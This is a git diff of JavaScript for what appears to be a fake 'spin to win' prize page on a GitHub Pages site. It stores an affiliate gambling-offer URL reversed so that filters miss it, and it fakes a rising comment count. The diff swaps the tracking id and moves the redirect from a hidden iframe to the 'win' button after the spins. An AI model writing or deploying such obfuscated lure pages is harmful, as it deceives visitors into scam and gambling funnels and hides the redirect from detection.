@@ -3,7 +3,7 @@ var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
 //var go_url = 'oi.buhtig.333yubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
-var go_url = 'oi.buhtig.333sreyubekac=di_bus?18e9c4a1570df3fd41625af5/l/moc.sreffo-sagevnakluv//:sptth';
+var go_url = 'oi.buhtig.333sreyubekac=di_bus?2c00c076d0f34c8255010be5/l/moc.sreffo-sagevnakluv//:sptth';
 var page_url = 'cakebuyers333.github.io';
 var new_url = go_url.split("").reverse().join("");
 
@@ -31,12 +31,15 @@ $(document).ready(function() {
 		comment_count_selector.text(comment_count_selector.attr('data-value'));
 	}, 12500);
 
-	$('#iframe1').attr('src', new_url);
-	$('#iframe-container').removeClass('hidden');
-	
+	//$('#iframe1').attr('src', new_url);
+	//$('#iframe-container').removeClass('hidden');
+	$('#win-btn').attr('href', new_url);
+
+	/*
 	setTimeout(function() {
 		$('#iframe2').attr('src', 'https://'+page_url+'/done.html');
 	}, 45000);
+	*/
 
 });
 
@@ -46,19 +49,18 @@ function forwardTo(goto_link)
 }
 
 $('#win-btn').click(function(e) {
-	e.preventDefault();
-	$('#iframe-container').removeClass('hidden');
+	//e.preventDefault();
+	//$('#iframe-container').removeClass('hidden');
 });
 
 $('#spin-btn').click(function() {
 //$('#overlay').click(function() {
 
-	/*
-	if(count_spins == 0)
+	if(count_spins == 2)
 	{
-		$('#iframe1').attr('src', new_url);
+		$('#iframe2').attr('src', 'https://'+page_url+'/done.html');
+		//$('#iframe1').attr('src', new_url);
 	}
-	*/
 	
 	if(count_spins < 3)
 	{
